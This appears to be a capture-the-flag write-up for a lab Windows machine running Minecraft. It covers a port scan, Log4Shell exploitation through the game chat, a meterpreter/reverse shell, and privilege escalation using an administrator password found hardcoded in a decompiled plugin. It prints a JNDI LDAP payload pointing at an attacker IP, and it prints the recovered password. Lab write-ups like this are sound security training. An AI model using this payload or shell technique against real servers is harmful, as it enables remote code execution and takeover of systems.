# PORT SCAN
* **80** &#8594; HTTP (IIS 10.0)
* **25565** &#8594; Minecraft (1.16.5)

<br><br><br>

# ENUMERATION & USER FLAG

Cool website and no need to tell you what is the scenario of this machine

![7d24909d2962ecc07057c078f6c74ed7.png](img/7d24909d2962ecc07057c078f6c74ed7.png)

The way to exploitthis was through [log4j](https://github.com/kozmer/log4j-shell-poc) abuse, a widely used libray for elasticsearch and **<u>minecraft</u>** too. We can use the PoC with a netcat listener (on the PoC we should change the command to be execute with `powershell.exe`)

![149245d6741f23a40d864379a710c4aa.png](img/149245d6741f23a40d864379a710c4aa.png)

To connect to the minecraft chat I used [this PoC right here](https://github.com/Hololm/MCMetasploit), this is the same as we are in the game chat!

![eaa21a14eb0b146c78d2fe46b59c666d.png](img/eaa21a14eb0b146c78d2fe46b59c666d.png)

Now we can send the payload for `log4j`, in my case (with my IP address) is `${jndi:ldap://10.10.14.15:1389/a}` and after using this on the chat the magic will happen!

![b255acc122e9a254c4e5da83f111b29f.png](img/b255acc122e9a254c4e5da83f111b29f.png)

I grabbed the flag as we are `svc_minecraft` user and spawn a meterpeter shell to be more 

<br><br><br>

# PRIVILEGE ESCALATION

Looking around the `svc_minecraft` home directoy I have found the only plugin inside the minecraft server, is a **.jar** so after the upload on my local machine I used `jd-gui` to decompile it and look inside. Is a simple Java Class that records the number of user inside the MC server but what's important is the presence of hardcoded credentials `s67u84zKq8IXw`

![e37ac762dfafa03777126c54fcf330ff.png](img/e37ac762dfafa03777126c54fcf330ff.png)

I tried to check with **runas** if this was teh administrator password and I was right

![6b6a95853e6986f154364fc0a11f23fc.png](img/6b6a95853e6986f154364fc0a11f23fc.png)

After that I used to directly read the root flag, but  same things can be done to spawn an high permission reverse shell

![b0b39dca2da312e6a62f62269104d15e.png](img/b0b39dca2da312e6a62f62269104d15e.png)
